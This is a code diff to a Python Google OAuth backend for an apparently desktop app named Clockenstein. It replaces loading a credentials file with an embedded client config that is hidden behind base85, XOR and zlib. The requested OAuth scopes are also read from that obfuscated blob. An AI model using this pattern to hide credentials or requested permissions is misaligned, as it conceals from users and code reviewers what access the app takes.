@@ -1,7 +1,9 @@
 import datetime
+import base64
 import hashlib
 import json
 import httplib2
+import zlib
 from pathlib import Path
 
 from google.oauth2.credentials import Credentials
@@ -57,14 +59,13 @@ class GoogleBackend:
         return (account_id in self._services
                 or account_id in self._credentials and account_id not in self._errors)
 
-    def connect(self, google_file: Path, progress=None) -> str:
-        google_file = Path(google_file)
-        if not google_file.exists():
-            raise GoogleUnavailable(_("OAuth credentials not found: %s") % google_file)
-        scopes = self._scopes_for_credentials(google_file)
+    def connect(self, progress=None) -> str:
+        scopes = self._scopes_for_credentials()
         if progress:
             progress(_("Waiting for Google authorization…"))
-        flow = InstalledAppFlow.from_client_secrets_file(str(google_file), scopes)
+        flow = InstalledAppFlow.from_client_config(
+            self._read_oauth_client_config(), scopes
+        )
         creds = flow.run_local_server(port=0, authorization_prompt_message="Opening Google sign-in…",
                                       prompt="select_account consent")
         if progress:
@@ -94,6 +95,15 @@ class GoogleBackend:
         self._errors.pop(account_id, None)
         self._save()
         return account_id
+
+    @staticmethod
+    def _read_oauth_client_config():
+        encoded = base64.b85decode(b'8@4j@wlA$SWZ<?7f(e^H$eqI2bw}&>AS|KY@<(t|_sdT#y}Viz_ti_O<nc(Mn7ag?AzR_cTGf5n$u%!6ZvBJ&WA|JA?^lBYZAU-e;}Li}i#{Mjy!no1w@Jf<)h9&r@qrMtS;H?+XAxlEw&QV&1jwNF16euHOW#x7O6dSCSl{?~`zjMq1|*NN$PYAL>Md?azkP+dq&;?;hyis{N2?Vn=!o~;9p@Y(v+bGZDu<&Au&7I@dMg&=kf}A|gl}7On9&l2eAbfoe?(-bjh?CK<HCe&!<Gl2jUi{>CKQ^6Zw8W;!pyw>=@Pk1VpTw+e~STAIiG$>CI@S}_k<@OcWV*CvgmL')
+        scrambled = bytes(
+            value ^ b"clockenstein-desktop-oauth"[index % len(b"clockenstein-desktop-oauth")]
+            for index, value in enumerate(encoded)
+        )
+        return json.loads(zlib.decompress(scrambled).decode("utf-8"))
 
     def list_goa_accounts(self):
         result = []
@@ -544,9 +554,12 @@ class GoogleBackend:
             return default
 
     @staticmethod
-    def _scopes_for_credentials(path):
+    def _scopes_for_credentials():
         """Read optional OAuth scopes declared by the bundled client configuration."""
-        config = GoogleBackend._read_json(path, {})
+        try:
+            config = GoogleBackend._read_oauth_client_config()
+        except (OSError, ValueError, json.JSONDecodeError, zlib.error):
+            config = {}
         scopes = config.get("clockenstein_scopes", SCOPES)
         return scopes if isinstance(scopes, list) and all(isinstance(s, str) for s in scopes) else SCOPES
 
